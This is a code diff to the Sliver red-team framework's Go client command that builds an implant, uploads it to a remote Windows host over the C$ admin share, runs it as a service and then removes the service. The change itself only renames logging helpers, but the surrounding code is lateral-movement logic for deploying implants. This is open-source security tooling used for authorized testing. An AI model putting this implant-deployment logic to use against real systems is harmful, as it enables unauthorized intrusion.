@@ -29,7 +29,6 @@ import (
 	"github.com/bishopfox/sliver/client/core"
 	"github.com/bishopfox/sliver/client/spin"
 	"github.com/bishopfox/sliver/client/transport"
-	"github.com/bishopfox/sliver/client/util"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/rpcpb"
@@ -63,8 +62,8 @@ func (s *Service) Execute(args []string) (err error) {
 	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
-		fmt.Printf(util.Error+"Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
-		fmt.Println(util.Error + "You might want to change that before going further...")
+		fmt.Printf(Error+"Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
+		fmt.Println(Error + "You might want to change that before going further...")
 		if !core.IsUserAnAdult() {
 			return
 		}
@@ -75,7 +74,7 @@ func (s *Service) Execute(args []string) (err error) {
 	go spin.Until(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
 	profiles, err := transport.RPC.ImplantProfiles(context.Background(), &commonpb.Empty{})
 	if err != nil {
-		fmt.Printf(util.Error+"Error: %v\n", err)
+		fmt.Printf(Error+"Error: %v\n", err)
 		return
 	}
 	generateCtrl <- true
@@ -87,7 +86,7 @@ func (s *Service) Execute(args []string) (err error) {
 		}
 	}
 	if p.GetName() == "" {
-		fmt.Printf(util.Error+"no profile found for name %s\n", profile)
+		fmt.Printf(Error+"no profile found for name %s\n", profile)
 		return
 	}
 	sliverBinary, err := getSliverBinary(*p, transport.RPC)
@@ -106,11 +105,11 @@ func (s *Service) Execute(args []string) (err error) {
 	uploadCtrl <- true
 	<-uploadCtrl
 	if err != nil {
-		fmt.Printf(util.Error+"Error: %s\n", err)
+		fmt.Printf(Error+"Error: %s\n", err)
 		return
 	}
-	fmt.Printf(util.Info+"Uploaded service binary to %s\n", upload.GetPath())
-	fmt.Println(util.Info + "Waiting a bit for the file to be analyzed ...")
+	fmt.Printf(Info+"Uploaded service binary to %s\n", upload.GetPath())
+	fmt.Println(Info + "Waiting a bit for the file to be analyzed ...")
 	// Looks like starting the service right away often fails
 	// because a process is already using the binary.
 	// I suspect that Defender on my lab is holding access
@@ -132,14 +131,14 @@ func (s *Service) Execute(args []string) (err error) {
 	serviceCtrl <- true
 	<-serviceCtrl
 	if err != nil {
-		fmt.Printf(util.Error+"Error: %v\n", err)
+		fmt.Printf(Error+"Error: %v\n", err)
 		return
 	}
 	if start.Response != nil && start.Response.Err != "" {
-		fmt.Printf(util.Error+"Error: %s\n", start.Response.Err)
+		fmt.Printf(Error+"Error: %s\n", start.Response.Err)
 		return
 	}
-	fmt.Printf(util.Info+"Successfully started service on %s (%s)\n", hostname, binaryPath)
+	fmt.Printf(Info+"Successfully started service on %s (%s)\n", hostname, binaryPath)
 	removeChan := make(chan bool)
 	go spin.Until("Removing service ...", removeChan)
 	removed, err := transport.RPC.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
@@ -152,14 +151,14 @@ func (s *Service) Execute(args []string) (err error) {
 	removeChan <- true
 	<-removeChan
 	if err != nil {
-		fmt.Printf(util.Error+"Error: %v\n", err)
+		fmt.Printf(Error+"Error: %v\n", err)
 		return
 	}
 	if removed.Response != nil && removed.Response.Err != "" {
-		fmt.Printf(util.Error+"Error: %s\n", removed.Response.Err)
+		fmt.Printf(Error+"Error: %s\n", removed.Response.Err)
 		return
 	}
-	fmt.Printf(util.Info+"Successfully removed service %s on %s\n", serviceName, hostname)
+	fmt.Printf(Info+"Successfully removed service %s on %s\n", serviceName, hostname)
 	return nil
 }
 
@@ -184,7 +183,7 @@ func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient)
 	_, ok := builds.GetConfigs()[implantName]
 	if implantName == "" || !ok {
 		// no built implant found for profile, generate a new one
-		fmt.Printf(util.Info+"No builds found for profile %s, generating a new one\n", profile.GetName())
+		fmt.Printf(Info+"No builds found for profile %s, generating a new one\n", profile.GetName())
 		ctrl := make(chan bool)
 		go spin.Until("Compiling, please wait ...", ctrl)
 		generated, err := rpc.Generate(context.Background(), &clientpb.GenerateReq{
@@ -205,7 +204,7 @@ func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient)
 		}
 	} else {
 		// Found a build, reuse that one
-		fmt.Printf(util.Info+"Sliver name for profile: %s\n", implantName)
+		fmt.Printf(Info+"Sliver name for profile: %s\n", implantName)
 		regenerate, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
 			ImplantName: profile.GetConfig().GetName(),
 		})
